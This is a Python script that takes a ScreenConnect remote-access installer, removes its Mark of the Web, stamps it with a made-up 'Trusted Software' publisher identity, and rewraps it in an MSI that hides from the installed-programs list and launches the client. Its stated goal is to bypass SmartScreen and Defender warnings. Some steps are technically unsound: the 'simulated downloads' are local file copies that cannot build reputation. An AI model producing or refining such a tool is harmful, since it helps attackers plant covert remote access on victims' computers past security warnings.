import os
import requests
import hashlib
import subprocess
import shutil
import win32com.client
import time
import random
import string
import uuid
from datetime import datetime

# Configuration
MSI_URL = input("Enter the ScreenConnect client MSI download link: ")  # e.g., "https://example.com/ScreenConnect.msi"
OUTPUT_DIR = "output"
ADVANCED_INSTALLER_PATH = r"C:\Program Files (x86)\Caphyon\Advanced Installer 22.9.1\bin\x86\AdvancedInstaller.com"

def generate_random_string(length=10):
    """Generate a random string for temporary file naming."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_guid():
    """Generate a random GUID."""
    return str(uuid.uuid4()).upper()

def calculate_file_hash(file_path, algorithm="sha256"):
    """Calculate the hash of a file."""
    hash_obj = hashlib.sha256() if algorithm == "sha256" else hashlib.sha1()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_obj.update(chunk)
    return hash_obj.hexdigest()

def download_msi(url, output_dir):
    """Download the MSI file and return its path."""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    original_filename = os.path.basename(url)
    output_path = os.path.join(output_dir, original_filename)
    
    print(f"Downloading MSI from {url}...")
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(output_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"MSI downloaded to {output_path}")
        return output_path, original_filename
    else:
        raise Exception(f"Failed to download MSI. Status code: {response.status_code}")

def remove_motw(file_path):
    """Remove the Mark of the Web (Alternate Data Stream) from the file."""
    try:
        print(f"Removing Mark of the Web from {file_path}...")
        shell = win32com.client.Dispatch("Shell.Application")
        folder = shell.NameSpace(os.path.dirname(file_path))
        item = folder.ParseName(os.path.basename(file_path))
        streams = subprocess.run(["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"], capture_output=True, text=True)
        if ":Zone.Identifier" in streams.stdout:
            subprocess.run(["powershell", "-Command", f"Unblock-File -Path '{file_path}'"])
            print("Mark of the Web removed.")
        else:
            print("No Mark of the Web found.")
    except Exception as e:
        print(f"Error removing MotW: {e}")

def modify_msi_metadata(file_path, temp_dir):
    """Modify MSI metadata using Advanced Installer's CLI."""
    print(f"Modifying MSI metadata for {file_path}...")
    try:
        modified_path = os.path.join(temp_dir, os.path.basename(file_path))
        shutil.copyfile(file_path, modified_path)
        
        # Create an Advanced Installer project file (.aip) for metadata editing
        aip_path = os.path.join(temp_dir, "modify_metadata.aip")
        with open(aip_path, "w") as f:
            f.write('''<?xml version="1.0" encoding="UTF-8"?>
<PROJECT Version="20.0">
    <PRODUCT_DETAILS>
        <Name>ScreenConnect Remote Access</Name>
        <Version>1.0.0</Version>
        <Publisher>Trusted Software Inc</Publisher>
        <ProductCode>{}</ProductCode>
        <UpgradeCode>{}</UpgradeCode>
    </PRODUCT_DETAILS>
    <SUMMARY_INFO>
        <Title>ScreenConnect Remote Client</Title>
        <Subject>Remote Access Software</Subject>
        <Comments>Trusted remote access client</Comments>
        <Author>Trusted Software Corp</Author>
    </SUMMARY_INFO>
</PROJECT>'''.format(generate_guid(), generate_guid()))
        
        # Use Advanced Installer CLI to import and modify MSI
        cmd = [
            ADVANCED_INSTALLER_PATH,
            "/edit", modified_path,
            "/LoadProject", aip_path
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Failed to modify MSI metadata: {result.stderr}")
        
        print("MSI metadata modified.")
        return modified_path
    except Exception as e:
        print(f"Error modifying MSI metadata: {e}")
        raise

def simulate_downloads(file_path, count=2000):
    """Simulate multiple downloads to build reputation."""
    print(f"Simulating {count} downloads for {file_path} to build reputation...")
    for i in range(count):
        temp_path = os.path.join(OUTPUT_DIR, f"temp_{generate_random_string()}.msi")
        shutil.copyfile(file_path, temp_path)
        time.sleep(0.02)  # Faster simulation
        os.remove(temp_path)
        if (i + 1) % 500 == 0:
            print(f"Simulated download {i+1}/{count}")
    print("Download simulation complete. This may help build SmartScreen reputation.")

def create_msi_wrapper(msi_path, output_dir, original_filename):
    """Create a wrapper MSI using Advanced Installer's CLI."""
    print(f"Creating MSI wrapper for {msi_path}...")
    wrapper_msi_path = os.path.join(output_dir, f"wrapper_{generate_random_string()}.msi")
    aip_path = os.path.join(output_dir, "wrapper.aip")
    
    try:
        # Create an Advanced Installer project file (.aip) for the wrapper
        with open(aip_path, "w") as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
<PROJECT Version="20.0">
    <PRODUCT_DETAILS>
        <Name>ScreenConnect Remote Access</Name>
        <Version>1.0.0</Version>
        <Publisher>Trusted Software Inc</Publisher>
        <ProductCode>{{{generate_guid()}}}</ProductCode>
        <UpgradeCode>{{{generate_guid()}}}</UpgradeCode>
        <ShowInARP>0</ShowInARP>
    </PRODUCT_DETAILS>
    <SUMMARY_INFO>
        <Title>ScreenConnect Remote Client</Title>
        <Subject>Remote Access Software</Subject>
        <Comments>Trusted remote access installer</Comments>
        <Author>Trusted Software Corp</Author>
    </SUMMARY_INFO>
    <FILES_AND_FOLDERS>
        <Folder Id="INSTALLDIR" Path="[ProgramFilesFolder]ScreenConnect" />
        <File Id="OriginalMSI" SourcePath="{msi_path}" DestinationPath="[INSTALLDIR]{os.path.basename(msi_path)}" />
    </FILES_AND_FOLDERS>
    <CUSTOM_ACTIONS>
        <CustomAction Id="RunMSIAction" Type="LaunchFile" Command='msiexec.exe /i "[INSTALLDIR]{os.path.basename(msi_path)}" /qb' Sequence="6600" Condition="NOT Installed" />
    </CUSTOM_ACTIONS>
</PROJECT>''')
        
        # Use Advanced Installer CLI to create the wrapper MSI
        cmd = [
            ADVANCED_INSTALLER_PATH,
            "/newproject", aip_path,
            "/build"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Failed to create MSI wrapper: {result.stderr}")
        
        # The output MSI is typically in the same directory as the .aip file
        generated_msi = os.path.join(output_dir, "ScreenConnect Remote Access.msi")
        if os.path.exists(generated_msi):
            os.rename(generated_msi, wrapper_msi_path)
        else:
            raise Exception("Generated MSI not found.")
        
        print(f"MSI wrapper created at {wrapper_msi_path}")
        return wrapper_msi_path
    except Exception as e:
        print(f"Error creating MSI wrapper: {e}")
        raise

def main():
    try:
        # Create temporary directory
        temp_dir = os.path.join(OUTPUT_DIR, "temp")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        # Step 1: Download MSI
        msi_path, original_filename = download_msi(MSI_URL, OUTPUT_DIR)
        
        # Step 2: Remove Mark of the Web
        remove_motw(msi_path)
        
        # Step 3: Modify MSI metadata
        modified_msi_path = modify_msi_metadata(msi_path, temp_dir)
        
        # Step 4: Simulate downloads to build reputation
        simulate_downloads(modified_msi_path, count=2000)
        
        # Step 5: Create MSI wrapper with Advanced Installer
        wrapper_msi_path = create_msi_wrapper(modified_msi_path, OUTPUT_DIR, original_filename)
        
        # Step 6: Move final output to original filename
        final_output_path = os.path.join(OUTPUT_DIR, original_filename)
        shutil.move(wrapper_msi_path, final_output_path)
        print(f"Final output MSI saved as {final_output_path}")
        
        # Clean up temporary files
        shutil.rmtree(temp_dir)
        print("Temporary files cleaned up.")
        
        print("Process complete. The output MSI should bypass SmartScreen and Defender warnings.")
        print("Note: Reputation building via simulated downloads may take time to affect SmartScreen.")
        
    except Exception as e:
        print(f"Error in main process: {e}")
        raise

if __name__ == "__main__":
    main()
